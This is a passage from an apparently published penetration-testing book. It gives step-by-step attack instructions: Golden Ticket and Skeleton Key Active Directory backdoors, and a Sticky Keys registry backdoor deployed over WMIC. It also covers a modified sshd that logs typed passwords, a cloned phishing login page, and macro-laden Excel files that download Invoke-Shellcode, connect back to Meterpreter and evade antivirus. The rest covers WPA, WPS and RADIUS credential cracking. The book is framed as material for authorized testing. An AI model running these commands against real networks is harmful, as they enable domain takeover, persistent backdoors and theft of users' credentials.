be accomplished using smbexec with a Domain Admin account. Running smbexec, I chose Hash
Dump and dumped the Domain Controller.

Recovering Hashes from the Domain Controller
Once completed, a log file will be created with the Domain Hashes. The hash that you will need is
the second part of the krbtgt hash.
krbtgt‚Äôs Hashes
Now we have everything we need to create the Golden Ticket. Go back to our original shell:
‚óè First drop into Mimikatz 2.0
‚óã use kiwi
‚óè Create Golden Ticket
‚óã golden_ticket_create -u <Domain Admin Username> -d <Domain> -
k <krbtgt hash> -s <Domain SID> -t <Location to Drop Golden Ticket>
Creating the Golden Ticket
That‚Äôs it. We now have a Golden Kerberos Ticket. As we said with our scenario before, your client
SUCK has asked you to come back for a remediation test. You verify that they fixed all the holes from
last time and passwords are reset, but remember you have the Golden Ticket.
You use a little spearphishing to get your initial handle into the company with an unprivileged shell.
You test your access by trying to see if you can read any files on the Domain Controller, but you don‚Äôt
have access. You take a look at your Kerberos tickets and see that you are a limited user.
Using the Golden Ticket
‚óè Shell Access with Limited Access (does not have to be Local Administrator)
‚óã sessions -i [id]
‚óè Load Mimikatz 2.0
‚óã use kiwi
‚óè Check current Kerberos Tickets
‚óã kerberos_ticket_list
‚óè Purge all Kerberos Tickets
‚óã kerberos_ticket_purge
‚óè Local our Golden Ticket (stored in /opt/ticket.txt on our Kali VM)
‚óã kerberos_ticket_use /opt/ticket.txt
‚óè Drop into a shell and read files off the DC
‚óã shell
‚óã dir \\DC\c$
Below, we are checking out what Kerberos tickets are currently have loaded. From reading the
access, all the tickets are currently owned by testuser1 (limited account).
Current Kerberos Tickets
We can verify this by dropping into a shell:
meterpreter > shell
Process 1524 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.
C:\Users\testuser1\Desktop>dir \\dc\c$
dir \\dc\c$
Access is denied.
Without Domain Administrative privileges, we can‚Äôt log into the Domain Controller. We need to first
purge all of our current Kerberos tickets. Once purged, use our Golden Key to create a ‚Äúlab‚Äù user
ticket. From the work prior, we found that the lab account had been part of the Domain Admin group.
Once we list our tickets again, we see below that we now have a ‚Äúlab‚Äù ticket in our ticket list.
Importing ‚Äúlab‚Äù Kerberos Tickets
If we do a listing on the Domain Controller, we can see that we now have full access to the DC. They
could have changed every user account password after the initial hashdump, but with the krbtgt hash,
we can create any Kerberos ticket we want.
Accessing the Domain Controller
With the Golden Ticket, we have access to servers, and can drop files, but how can we execute
commands using the Kerberos Domain Admin Ticket?
As shown in prior chapters, WMIC supports the ability to execute remote commands. This command
uses the current Kerberos Tickets against a remote server (Node). We are going to execute a ping
command, write that to a file on a remote Windows 8 server from our compromised Windows 7
Golden Ticket box.
‚óè wmic /authority:"Kerberos:hacker.testlab\win8" /node:win8 process call create
"cmd /c ping 127.0.0.1 > C:\log.txt"
WMI and Kerberos Ticket
Double-checking our Windows 8 host, we see that the command was successful and we can now
move laterally throughout the whole domain.
Validate Command Execution
Skeleton Key
As a penetration tester, one of your greatest resources is monitoring what the real bad guys are doing.
For example, Dell Secureworks identified malware that would backdoor privileged Active Directory
accounts:
http://www.secureworks.com/cyber-threat-intelligence/threats/skeleton-key-malware-analysis/.
Luckily for us Benjamin Delpy and his amazing tool Mimikatz implemented the Skeleton Key feature.
{28} This attack will backdoor a Domain Administrative account. Let‚Äôs say you have already gained
a domain admin account and you were able to log into a domain controller (remember you will have
to do this to every domain controller in the environment). We can put a copy of our modified
Mimikatz on there so we don‚Äôt trigger antivirus.
To install our Skeleton Key is pretty easy:
‚óè mimikatz.exe ‚Äúprivilege::debug‚Äù ‚Äúmisc::skeleton‚Äù exit
Skeleton Key
If we go back to any computer on the network and try to connect to the Domain Controller, of course
we won‚Äôt have access with our regular Active Directory account. We try to run ‚Äúdir \\dc\c$‚Äù to read
the C-Drive on the domain controller. But don‚Äôt forget about our skeleton key.
Even if we don‚Äôt know the password of the domain admin account ‚Äúlab‚Äù, with the Skeleton Key
implemented, we can use the new backdoor password of ‚Äúmimikatz‚Äù.
To demonstrate this we can mount a drive from any computer on the network using the password
‚Äúmimikatz‚Äù and with the ‚Äúlab‚Äù account from which we executed the skeleton key from.
In the first command we try to read files from the domain controller, but are unsuccessful.
‚óè net use * \\dc\c$ mimikatz /user:lab@hacker.testlab
Next, we mount a share drive to the domain controller‚Äôs C-Drive using the ‚Äúlab‚Äù account and the
backdoor password ‚Äúmimikatz‚Äù.
Skeleton Key - Backdoor Password
We now have full access into the domain controller with our backdoor password. Both the original
domain admin‚Äôs password and mimikatz will work at the same time.
Sticky Keys
Sticky Keys is one of my favorite persistence methods. If you have never dealt with sticky keys
before, try hitting shift 5 times on any Windows host. Microsoft states that:
‚ÄúStickyKeys is designed for people who have difficulty holding down two or more keys at a time.
When a shortcut requires a key combination such as Ctrl+P, StickyKeys allows you to press one key
at a time instead of pressing them simultaneously.‚Äù {29}
We can take advantage of sticky keys by replacing the sticky key executable with a shell. The old
method used to manually replace sethc with cmd, but this can now be done within registry settings.
‚óè REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d
"C:\windows\system32\cmd.exe"
‚óè REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal
Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0
‚óè REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal
Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0
Two additional settings you might need to run:
‚óè Change firewall setting to allow RDP
‚óã netsh advfirewall firewall set rule group="remote desktop" new
enable=Yes
‚óè Enable Remote Desktop Connections
‚óã REG ADD
"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TermServer" /v fDenyTSConnections /t REG_DWORD /d 0 /f
Don‚Äôt forget the power of WMI and being able to trigger these settings remotely. Remember you will
be a privileged local administrative account or domain admin.
‚óè wmic /user:[User_Name] /password:[Password] /node:[Server] process call create
"C:\Windows\system32\reg.exe ADD \"HKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Image File Execution Options\sethc.exe\" /v Debugger /t REG_SZ
/d \"C:\windows\system32\cmd.exe\" /f"
‚óè wmic /user:[User_Name] /password:[Password] /node:[Server] process call create
"C:\Windows\system32\reg.exe ADD
\"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDPTcp\" /v UserAuthentication /t REG_DWORD /d 0 /f"
‚óè wmic /user:[User_Name] /password:[Password] /node:[Server] process call create
"C:\Windows\system32\reg.exe ADD
\"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDPTcp\" /v SecurityLayer /t REG_DWORD /d 0 /f"
Optional Commands:
‚óè wmic /user:[User_Name] /password:[Password] /node:[Server] process call create
"C:\Windows\system32\netsh advfirewall firewall set rule group=\"remote desktop\"
new enable=Yes"
‚óè wmic /user:[User_Name] /password:[Password] /node:[Server] process call create
"C:\Windows\system32\reg.exe ADD
\"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal
Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
Because we are leveraging WMI, you also have the ability to use Kerberos, if needed, by changing
the username/password to /authority:"Kerberos:[Domain]\[Server]". Remember pass the ticket?
Once we have configured these registry settings, we can RDP to that host without any credentials, hit
shift 5 times, and we have a system shell.
If you ever lose your original shell and the user changes their password, you still have your backdoor.
Sticky Keys
Conclusion
I hope this chapter was able to get you comfortable with getting onto the network and moving laterally
through the network. There are a large number of attacks that can help in both lateral movement and
privilege escalation, but it really comes down to understanding what is in scope of your test and what
has the highest probability of assisting you. It might take a few of the attacks in the Lateral Movement
section to get you to a Domain Administrator, but keep this chapter handy as sometimes you will run
into a brick wall and something in this book might just get you out of a jam.
The Screen - Social Engineering
If client attacks are in the scope of your tests, social engineering is your "go to" attack. There are
many different ways to perform social engineering attacks and these can range from domain attacks to
spear phishing, or even dropping USB sticks. Since social engineering attacks really use your own
creativity, I will just go over a few examples that I have found to be fruitful.
Doppelganger Domains
I spent a lot of research time looking into doppelganger domains and trying to find the most efficient
and most ‚Äúbang for your buck‚Äù attacks. You can find more in my research paper here:
http://www.wired.com/threatlevel/2011/09/doppelganger-domains/.
The concept of my research paper was to brute-force company domains for valid subdomains that had
MX records. For my next few examples we have two different fictitious companies who utilize their
sub-domains for email: us.company.com and uk.company.com. What I had done was to purchase all
domains for uscompany.com, ukcompany.com and so on. This is because end users very frequently
make the mistake of forgetting to type in the period between the domain and sub-domain.
SMTP Attack
Once I purchased these domains, I set up an SMTP server, configured the MX records, and finally set
all SMTP servers as catch-all servers. This means that if anyone emails to the domain I own,
regardless of to whom it is sent, I would record/forward all those emails to an account of my choice.
This is usually enough to prove that you can successfully capture sensitive data and that you will see a
lot of sensitive emails from the corporation. If you go to the article above, you will see what type of
data was gathered and how many times we were able to get SSH/VPN/Remote Access into a
company. We also took this proof of concept attack one step farther.
In the following example, we are targeting the fake site bank.com, who has a subsidiary in Russia.
The fake bank owns ru.bank.com and has MX records to that FQDN. Also, company.com (another
fake company), owns us.company.com and has MX records for that FQDN. In this fake example, we
purchase both the doppelganger domains uscompany.com and rucompany.com. If anyone mistypes an
email to either domain, we will be able to inject ourselves into the middle of this conversation. Using
a few simple python scripts, when we receive an email from john@us.company.com to
bob@rubank.com (mistyped doppelganger for ru.bank.com), our script will take that email and create
a new email to bob@ru.bank.com (the proper email address) and sourced fromjohn@uscompany.com (the mistyped doppelganger that we own). That means any reply response to
John from Bob will come back through us. Now, we have a full "Man in the MailBox" configured and
can either just passively listen or attack the victims based on the trust factor they have with each
other.
Man in the MailBox Example
SSH Attack
During my research, I also configured SSH servers with the doppelganger domains to see if people
mistyped SSH servers and revealed their SSH passwords. There are a couple of things that need to be
configured for a successful attack.
First, set the DNS A record to point all records to a particular IP. For example, I set the A record
host to "*" and pointed the host record to my IP address. Any subdomain within the doppelganger will
point back to my server. This means the following domains will all point back to a single IP:
‚óè test.uscompany.com
‚óè dev.uscomany.com
‚óè deadbeef.uscompany.com
Then, set up an SSH server that logs both the username and password. In my case, I configured a
server running Ubuntu 11.10. Since normal sshd does not record the passwords, I had to modify a
version of sshd. This is done by downloading openssh portable 5.9p1:
wget http://mirror.team-cymru.org/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz
To Extract OpenSSH:
‚óè tar xvfz openssh-5.9p1.tar.gz
‚óè Go into the openssh directory:
‚óã cd openssh-5.9p1
It is required to modify the auth-passwd.c file before compiling sshd. Below is what I changed, but I
have also included the whole auth-passwd.c file you should replace in sshd
[https://www.securepla.net/download/auth-passwd.c]:{30}
if(!sys_auth_passwd(authctxt, password))
{
FILE *garp;
garp = fopen("/var/log/sshd_logged", "a");
chmod("/var/log/sshd_logged", 0600);
fprintf(garp,"%s:%s:%s\n",authctxt->user,password,get_remote_ipaddr());
fclose(garp);
}
return (result && ok);
Now, when I have an invalid login, I write out the username, password, and IP address into a file
located in /var/log/sshd_logged.
After replacing the auth-passwd.c file, let's compile and make it:
‚óè sudo ./configure --prefix=/opt --sysconfdir=/etc/ssh
‚óè make
‚óè sudo make install
I should have a working version of our new sshd service. To start sshd:
‚óè /opt/sbin/sshd
Then, run the command and you should see username password combinations scroll by:
‚óè tail -f /var/log/sshd_logged
Output:
‚óè root: Harmon01:192.168.10.10
‚óè admin: AMW&369!: 192.168.10.111
‚óè tomihama: tomihhama:192.168.10.24
‚óè root: hx7wnk:192.168.10.19
We are successfully recording username/password combinations. You will have to be extremely
patient with this attack and hope a developer or IT user mistypes the domains to SSH. I love these
attacks because they are not the normal types of attacks and give you the chance to get creative with
them.
Phishing
Phishing, or email in general, is one of the most commonly used and effective vectors for remote
attacks. This is because they rely on users as victims, instead of unpatched or misconfigured services.
Victims can be easily swayed to perform actions generally based on fear and urgency. The fear and/or
urgency usually stems from some type of financial loss, personal loss, or the fear of missing out. If
you can trigger one of these emotions, it can cause a victim to do things they wouldn‚Äôt normally do.
Although there are numerous books on manipulating people, two books I would recommend:
‚óè Behavioral Programming (2015): The Manipulation of Social Interaction -
http://amzn.to/1CJGb4y
‚óè Social Engineering: The Art of Human Hacking (2010) - http://amzn.to/1CJH3pQ
These books describe types of social interactions, manipulation of people, word selection, and many
tools for all methods of social engineering.
In the first THP, I focused on using Metasploit pro, but I decided to go with open source in this
example, which allows me to get more creative. After setting up a few phishing exercises, you will
see that it is pretty easy.
There are plenty of open source phishing tools, such as:
‚óè Catero: http://section9labs.github.io/Cartero/
‚óè Phishing Frenzy: http://www.phishingfrenzy.com/
‚óè Social Engineering Toolkit: https://github.com/trustedsec/social-engineer-toolkit
However, after running numerous phishing attacks, I found that having numerous custom scripts ready
for different scenarios works best. Although this might not work for your situation, this should help
you get different ideas for a successful campaign.
Manual Phishing Code
(https://github.com/cheetz/spearphishing)(Kali Linux):
This is a sample beta code I have written to take care of my spear phishing campaigns. The code
repository is located here: https://github.com/cheetz/spearphishing and it is really up to you to
customize it for your own campaign. In the default code, we are going to use GoDaddy‚Äôs SMTP
services, but you can easily customize it according to your own SMTP server. The spear.py client
script will modify an html page that will get sent to all it‚Äôs victims. Take time to read and understand
the code before executing. Let‚Äôs walk through a phishing example.
Setting up the client to send out emails:
‚óè cd /opt/spearphishing/client
‚óè edit spear.py and modify the following:
‚óã domain = "suck.yourdomainthatyouown.com" #The Domain That You
Own
‚óã company_name = "SUCK" #The Company Name
‚óã me = "auto-confirm@" + domain #Email return address
‚óã host = 'smtpout.secureserver.net' #Godaddy SMTP server
‚óã login = '' #Godaddy Login
‚óã password = '' #Godaddy password
‚óã edit emails.txt and add email addresses
To run the SMTP script:
‚óè python ./spear.py
Sample Spearphishing Email
If you look closely at the bottom, all URLs point to our domain with both the session ID and ge ID.
One thing you need to do is heavily test your phishing exercises. There are some phishing campaigns
that get flagged as SPAM and others that don‚Äôt. You need to find that right balance.
Web Filtering Bypass for Your Domains:
Once in a while, I will see a company actively using a web proxy for all of their Internet traffic. In
this situation, anything that isn't categorized will be blocked and my reverse shells can‚Äôt seem to work
around their filter. However, there are things you can do to help your success rate. For doppelganger
domains that I have purchased specifically for testing, I set up a simple CNAME or Canonical Name
on that domain to point to the original domain that I have doppelgangered. I will let that doppelganger
domain sit there for a few days or weeks before the test. Why? This will allow the site to get
automatically crawled by a number of different systems. When the crawlers see the CNAME
configured to the real site, they will assume that it was purchased by that company and turn that
domain into the same category of approved domains. Once your test starts, just remove the CNAME
and configure the IP of the actual malicious server.
Setting Up the Server:
We are going to setup a web server that will look like a real authentication page to capture
credentials.
‚óè cd /opt/set
‚óè ./setoolkit
‚óè 1) Social-Engineering Attacks
‚óè 2) Website Attack Vectors
‚óè 3) Credential Harvester Attack Method
‚óè 2) Site Cloner
‚óè set:webattack> IP address for the POST back in Harvester/Tabnabbing: [your kali
IP]
‚óè set:webattack> Enter the url to clone: [Website to Clone]
Social Engineering Toolkit - Clone Site
Let's make some quick modifications. To help make spear phishing more successful, make sure it
looks authentic and minimize the amount of information the user needs to input. A simple way to
accomplish this is to add their email address in the login field. This makes it look like they have
logged onto this site before.
Once you have cloned a site, all files are copied to /var/www. Let's modify the files:
1. cd /var/www
2. We need to make the file be able to support server side scripting
1. mv index.html index.php
3. We need to identify the username field. If we open the original login page, right-click in the
Username Field, and Inspect Element (in Firefox). We can quickly see where the code is in this
field and modify our file to include the victim‚Äôs email address.
Fake Login Page
4. gedit index.php and locate the code from step 3 (in this specific scenario, we case search for
login_field) and add the code below. This automatically appends the user‚Äôs email in the login
field and 4b is used solely for tracking purposes.
1. Inside the login input field, add: value="<?php if(isset($_GET['ge'])) {echo
base64_decode($_GET['ge']);} ?>"
2. Somewhere below, add: <input type="hidden" name="user_id" value="<?php print
$_GET["id_session"];?>"/>
Code Modifications to Include User Email Address
Now, we can go visit the cloned website we created. If we add two additional parameters to the
index.php page, we can see how this small change can increase our success rate. The ge field accepts
a base64 string, using ‚ÄúYm9va0B0aGVoYWNrZXJwbGF5Ym9vay5jb20=, which decodes to
book@thehackerplaybook.com. There is also an id_session field that is just an MD5 of the original
email address. I do this in the event they decide to change the username email address to a different
email address, I will know which original user is inputting these requests.
Login with User Email
When anyone types in their password and hits the ‚ÄúSign in‚Äù button, this information will all be logged
to a file called harvester, along with the date. Let‚Äôs read the file by: cat harvester*
Password Results
The reason I go through the manual method of creating spear phish emails and client servers, is to
have it look as authentic and specific as possible. There are a lot of different tools that can be
purchased to provide spear phishing campaigns, but most are limited in the types of sites or templates
that are included.
Social Engineering with Microsoft Excel
In the first book, I explained how to add macros manually to create malicious Excel payloads that can
be used in Spear Phishing Campaigns. This section is an extension of that.
Sometimes you find yourself in an environment where you can't use JAVA or web-based attacks. It
might be because you have to deliver your payload via an email attachment or want to use physical
media for your attack (i.e. USB sticks or CDs). One of the best success rates I have had with these
types of attacks was by utilizing a trust relationship between the attacker and victim and including an
Excel spreadsheet that had a Meterpreter payload. When I say a trust relationship, I mean find
someone with whom the victim might regularly communicate files and spoof his or her email address.
Even better, in the initial Compromised List section, you might have been able to gain a few
credentials. Log into the corporate Outlook Web Access (OWA) mail server and start emailing
employees that have regular communication with your compromised credential.
The problem with using Metasploit to generate its own Excel files is that a lot of times they will
trigger anti-virus. To mitigate this, we are going to use the same tactics we did in the Lateral
Movement section and take advantage of PowerShell.
On your Windows Attacking Host, download Generate-Macro.ps1:
https://raw.githubusercontent.com/enigma0x3/Generate-Macro/master/Generate-Macro.ps1
Generate-Macro.ps1 creates a malicious Excel file with a PowerShell payload to connect back to a
Metasploit Meterpreter handler. It even goes one step farther and adds persistence by creating a vbs
file in the C:\users\public\ folder and adding a registry setting to call that script upon bootup.
C:\Users\hp2\Downloads\Generate-Macro-master>powershell -exec bypass
PS C:\Users\hp2\Downloads\Generate-Macro-master> .\Generate-Macro.ps1
Enter URL of Invoke-Shellcode script (If you use GitHub, use the raw version):
https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke-
-Shellcode.ps1
Enter IP Address: 192.168.199.128
Enter Port Number: 443
Enter the name of the document (Do not include a file extension): records
--------Select Attack---------
1. Meterpreter Shell with Logon Persistence
2. Meterpreter Shell with Powershell Profile Persistence (Requires user to be local
admin)
3. Meterpreter Shell with Microsoft Outlook Email Persistence
------------------------------
Select Attack Number & Press Enter: 1
--------Select Payload---------
1. Meterpreter Reverse HTTPS
2. Meterpreter Reverse HTTP
------------------------------
Select Payload Number & Press Enter: 1
Saved to file C:\Users\hp2\Desktop\records.xls
Next, we need to setup our standard Meterpreter Handler:
‚óè cd /opt/
‚óè msfconsole -r ./listener.rc
Open up the Excel file:
Excel Malicious File
Here is the Macro File that was generated by the PowerShell Script:
Malicious Macro File
When you enable the Macro, it will connect back to your Kali Meterpreter handler:
Excel Execution - Meterpreter
The script will also add persistence. It creates a file in C:\Users\Public\ called config.vbs. It also
creates a registry entry under: HKCU\Software\Microsoft\Windows
NT\CurrentVersion\Windows\Load to start that vbs file upon bootup.
So, every time this system reboots, the PowerShell script will download invoke-shellcode and
connect back to your Meterpreter handler.
Registry Persistence
I ran these Excel files through numerous AV tools and not a single one triggered. As long as you can
get a user to enable the Macro, you are good to go.
Phishing Reporting
As stated many times throughout this book, the most important part of any test is reporting. I have
linked a sample phishing report that you can use as a template.
‚óè Work with the security team to figure out how many users reported the phish
‚óè Record information that includes how many users clicked/opened the attachment and
how many conversions (i.e. entered password/executed malicious files)
‚óè Identify if the security team would have been notified by their users if this had been
a real attack
‚óè Since every social engineering attack is very different, a section should include
reasons for successes or failures
‚óè Remediation plan or areas to improve results
I haven‚Äôt seen many public templates for phishing campaigns, but have
included a sample report at:
http://thehackerplaybook.com/Download/2015_RT_Phishing_SUCK_REPORT.pdf.
The Onside Kick - Attacks That Require Physical
Access
The onside kick is a dangerous tactic that provides huge beneficial results. The problem with these
types of attacks is that they generally require close proximity and have high potential of alarming your
victim. In this chapter, I will explain how to exploit wireless networks, card cloning, creating a
penetration drop box, and dropping USB sticks. Please remember, if you are going to do these types
of attacks, then get written approval from the company with which you are working.
Exploiting Wireless
Before we begin talking about exploiting wireless, I want to state that many of the basic attacks for
WIFI haven‚Äôt changed from the previous book. To eliminate the need to carry two books, I have
included the relevant WIFI material from the last book along with the newer attacks.
I am often asked what the best card is for wireless sniffing and attacking. I don't have the exact
technical comparison, but from my experience, I have had the most success and luck with the Alfa
AWUS036NHA.{31} This USB wireless adaptor supports 802.11 a/b/g/n and works natively with
Backtrack and Kali. This card also uses the Atheros chip set, of which I am a big fan. The reason that
I use a USB wireless card is that my Kali system is generally a VM, which can't utilize the native
built-in wireless card.
Passive - Identification and Reconnaissance
Passive WIFI testing puts the WIFI card in a sniffing mode to identify access points, clients, signal
strengths, encryption types, and more. In a passive mode, your system will not interact with any of the
devices, but this mode is used for recon/identification.
To start any WIFI assessment, first kick off Kismet. Kismet is a great WIFI tool to sniff, identify, and
monitor wireless traffic. At any terminal window in Kali, type:
‚óè kismet
This will open the Kismet application, which will need your wireless interface information (you can
do a quick ifconfig on a separate terminal window to find this information). In this case, my wireless
interface is on wlan1.
If everything works properly, you can close that window (try pressing the tab button if you are stuck)
and you will see a listing of all the SSIDs, channels, signal strength, and more.
SSIDs and AP information
The colors of the different wireless networks represent the following:
‚óè Yellow - Unencrypted Network
‚óè Red - Factory default settings in use
‚óè Green - Secure Networks (WEP, WPA, etc.)
‚óè Blue - SSID cloaking on / Broadcast SSID disabled{32}
After selecting an SSID, you will immediately see information about that Access Point such as the
BSSID, manufacturer, type of encryption (in this
case WEP), and signal strength/packet loss. This is great for identifying where an access point is
located and how we are going to attack it.
By pressing the "~" (tilde) key, V key, and then the C key, you will see all the clients that are
connected to this access point.
Finding Clients Connected to an AP
This is useful when doing de-authentication attacks or denial of service attacks against the access
point in the Active Attacks section.
Active Attacks
After you identify the networks you are to attack or networks that are within scope of your
assessment, you need to figure out which active attacks to use. We are going to focus on four main
types of attacks‚Äìthose against WEP, WPAv2, WPA WPS, and WPA Enterprise.
One thing I want to reiterate is that we are going for the quickest and easiest way to crack wireless
passwords or gain access to a wireless infrastructure. There are many different tools to attack WIFI
(aircrack-ng http://www.aircrack-ng.org/ is one of my favorites), but I will focus on getting the job
complete.
WEP - Wired Equivalent Privacy
We should all know by now that using WEP for wireless networks is insecure. I won't go into the
details, but if you want to read about how it was implemented and configured improperly, you can
visit the Wikipedia page:
http://en.wikipedia.org/wiki/Wired_Equivalent_Privacy.
If the organization is utilizing WEP and has at least one client, you should be able to crack the WEP
password without an issue.
To accomplish this, we are going to use the Fern-Wi-Fi-Cracker tool to identify WEP networks and
attempt to crack them. I am using Fern-Wi-Fi-Cracker because it is native to Kali and utilizes
Aircrack-ng (which is my favorite Wi-Fi tool). One quick caveat: for the example below, the access
point you are attacking needs to have at least one active host on that network. There are ways to get
around this (search Newsham's Attack), but I won't go over them in this book because the following
attack is the most common situation you will run into.
How to Crack WEP in Kali:
‚óè At a command prompt, type:
‚óã fern-wifi-cracker
‚óè Select the drop down and pick your Wi-Fi (most likely wlan0)
‚óè Click the Scan button
‚óè And drop into WEP (the red Wi-Fi sign)
Fern WIFI Cracker
‚óè Select the SSID you want to attack (in this case, Rocket)
‚óè Click on Wi-Fi Attack on the right side
‚óè Watch the IV count. You will need at least 10k IVs to crack the password
‚óè If it is successful, you will see the WEP key below
WEP Key Cracking
Now, you can connect to that SSID and are now on that network.
WPAv2 (TKIP) - Wi-Fi Protected Access
WPAv2 doesn't have a vulnerability like WEP, so cracking the password is much more difficult. To
have a successful attack, you need to capture the authentication handshake from a client to the access
point. To cheat in this process, we can force a user to de-authenticate and then re-authenticate. Once
we capture the handshake, we won't be able to just strip the password out‚Äìwe will have to bruteforce or crack the password. Let's see this in progress.
Before we can start sniffing, we need to enable the capture file settings within Fern-WiFi-Cracker, in
order to use this handshake file to crack.
‚óè At a command prompt, type:
‚óã fern-WiFi-cracker
‚óè Go to the ToolBox
‚óè Click on the WIFI Attack Options
‚óè Select Capture File Settings
Enabling Capture File Settings
‚óè Hit ESC until you are back at the home screen of Fern-Wifi-Cracker
‚óè Select the drop down and pick your Wi-Fi (most likely wlan0)
‚óè Click the Scan button
‚óè And drop into WPA (the blue Wi-Fi sign)
‚óè Select your SSID to attack
‚óè Click on WIFI Attack
‚óè In the following image, you will see the cap file created
WPA Handshake Capture
We need to first clean the cap file to make sure it will work with our password cracker. This can be
accomplished with wpaclean:
‚óè wpaclean <out.cap> <in.cap>
Please note that the wpaclean options are the <out.cap> <in.cap> instead of <in.cap> <out.cap>
which may cause some confusion.{33}
To crack the WPA handshake, we need to convert the clean cap file into an hccap file. We are going
to do this with aircrack-ng:
‚óè aircrack-ng <out.cap> -J <out.hccap>
‚óè Note the -J is an upper case J and not lower case j.
Cleaning WPA Files
This will give you the file that you use to crack into oclHashcat. Remember that the only way to get
the password for WPAv2 is to brute-force the password. To see how to accomplish WPAv2 hccap
password-cracking, go to the Cracking WPAv2 with oclHashcat section below.
WPAv2 WPS (Wi-Fi Protected Setup) Attacks
WPS (originally known as Wi-Fi Simple Config) was created to make it simple to establish a secure
connection to a wireless router/access point.{34} All you need to do is to enter a PIN when
connecting to an access point without knowing the long complex password. The issue stems from the
fact that the PINs required could be brute-forced relatively quickly.{35} What's even better is that on
some access points you cannot disable WPS even if you turn it off in the configuration page. As you
saw previously with Kismet, the manufacturer of the device can be identified via passive sniffing.
Here is a Google document that lists a large number of vulnerable devices and the tools that could be
used to attack WPS:
http://bit.ly/1eRN0qj.
The steps to attack WPS are similar to WPAv2, but instead of a Regular Attack, pick the WPS_Attack
and wait for the results. The same Google document just referenced gives the estimated time it would
take to attack that specific device.
WPS Attack
WPA Enterprise - Fake Radius Attack
One of my favorite attacks for enterprise environments is the fake radius attack. The problem with
WPAv2 Enterprise networks is that all the normal WEP/WPAv2 TKIP type attacks do not work. To
get around this, Josh Wright developed a method to capture username/password combinations for
WPAv2 Enterprise-grade wireless using a radius server.{36}
Configuring a Radius server
To configure your Radius server, we need to download and modify it. Download the Radius software
(Research, concept, and code originated from:
(http://www.willhackforsushi.com/presentations/PEAP_Shmoocon2008_Wright_Antoniewicz.pdf):
‚óè wget ftp://ftp.freeradius.org/pub/freeradius/old/freeradius-server-2.1.12.tar.bz2
‚óè tar xfj freeradius-server-2.1.12.tar.bz2
‚óè cd freeradius-server-2.1.12
‚óè wget http://willhackforsushi.com/code/freeradius-wpe-2.1.12.patch
‚óè We need to next patch our Radius server:
‚óã patch -p1 < freeradius-wpe-2.1.12.patch
‚óã ./configure && make && make install
‚óè We need to edit the configurations:
‚óã cat >> clients.conf <<EOF
‚óã client 192.168.1.1 {
‚óã secret = mysecret
‚óã }
‚óã EOF
‚óè radiusd -X
‚óè In a separate terminal:
‚óã tail -f /usr/local/var/log/radius/freeradius-server-wpe.log
Example Output:
mschap: Fri Jun 7 02:19:39 2013
username: admin
challenge: 07:50:2a:b7:a6:4d:24:d1
response: fc:9d:19:06:c0:79:c3:f5:ad:db:6b:79:59:2f:7f:6e:d8:05:19:c4:5d:26:30:08
mschap: Sat Jun 8 23:02:39 2013
username: user1
challenge: 34:ab:f0:95:62:52:85:40
response: 9e:0c:e7:80:06:2f:a0:0b:c3:d7:c7:d7:c6:38:ec:0a:e5:a3:57:8c:33:2c:8e:0f
mschap: Sat Jun 8 23:28:43 2013
username: test
challenge: 12:ea:f1:24:f5:4b:e8:7e
response: be:17:da:45:c0:88:ed:9c:eb:c9:5c:38:b8:1f:3e:8f:90:cd:17:16:ad:87:b3:ed
Once you capture the challenge/response and username for the authentication request, you can move
on to prepping the password lists. Before you can crack the passwords, you need to convert a word
list to be used with the Asleap application to try to brute-force passwords. This can be accomplished
using the following code to convert the darkc0de password list into multiple output files for Asleap.
‚óè genkeys -r darkc0de.lst -f words.dat -n words.idx
Asleap is a tool used to recover LEAP and PPTP type connections, which utilize a password list
from genkeys. Asleap will take in the challenge and responses as demonstrated below.
root@bt:~/wireless# asleap -f words.dat -n words.idx -C 07:50:2a 7:a6:4d: 24: d1 -R fc:9d:19:06:
c0:79:c3:f5:ad:db:6b:79:59:2f:7f:6e:d8:05:19:c4:5d:26:30:08
asleap 2.2 - actively recover LEAP/PPTP passwords. <jwright@hasborg.com>
hash bytes: 0157
NT hash: 5e7599f673df11d5c5c4d950f5bf0157
password: hacker
In the example above, we were able to decrypt the challenge/response ash for a WPA-Enterprise
authentication. Now, take these credentials and log back into their wireless network.
Wifite
(https://github.com/derv82/wifite)(Kali Linux)
Wifite is another WIFI attacking tool that I highly recommend using. With similar functionality to fernwifi-cracker, Wifite is another gui-front end to Aircrack-ng and Reaver. In certain cases, I found
Wifite to work better than my other tools. To start Wifite:
‚óè cd /opt/wifite
‚óè python ./wifite.py
Once you have wifite.py running, it automatically starts scanning the networks for access points. In the
image below, we identify a WEP network with an ESSID of ‚Äúme‚Äù.
Wifite Example
Once you have identified a target, press ‚ÄúCTRL-C‚Äù and pick the value of the ESSID you want to
attack. In this case, we will attack ESSID number 5. Once selected, this will kick off the WEP attack
to capture and crack IVs.
Successful Attack
That‚Äôs pretty much it. Even better, if the access point isn‚Äôt vulnerable to WEP attacks, but is
vulnerable to WPS and utilizes WPAv2, Wifite will kick off Reaver to attack WPS. If that is
unsuccessful, it will attack WPA by disassociating clients and capturing the authentication handshake.
WifiPhisher
(https://github.com/sophron/wifiphisher.git)(Kali Linux)
Wifiphisher is a security tool that mounts fast, automated phishing attacks against WiFi networks in
order to obtain secret passphrases and other credentials. It is a social engineering attack that, unlike
other methods, does not include any brute forcing. It is an easy way for obtaining credentials fromcaptive portals and third party login pages or WPA/WPA2 secret passphrases.{37}
I love seeing creative WIFI type attacks. This is nothing new in terms of standing up a cloned SSID,
deauthing users, and cloning pages, but WifiPhishing put all these attacks together in an easy-to-use
